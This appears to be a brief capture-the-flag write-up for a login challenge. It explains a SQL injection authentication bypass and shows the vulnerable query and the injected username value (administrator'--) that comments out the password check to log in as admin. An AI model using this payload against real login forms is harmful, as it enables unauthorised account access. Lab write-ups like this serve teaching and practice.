https://pwnbox.io/challenges/login-ledger
The idea is simple we are dealing with a SQLi and this format first we most break it then fix it, this idea works for every Injection Attack.
so we have some thing like this at first:
```sql
SELECT username, role, display_name AS displayName FROM users WHERE username = '' AND password = ''
```
you most give user name and password and then it would solve it but in this case we want to be the admin and we don't have the password so we most do some thing that the statement ignore the password part:
```sql
SELECT username, role, display_name AS displayName FROM users WHERE username = 'administrator' --' AND password = ''
```
we break it with an extra ' and we fix it with the commenting -- and done.
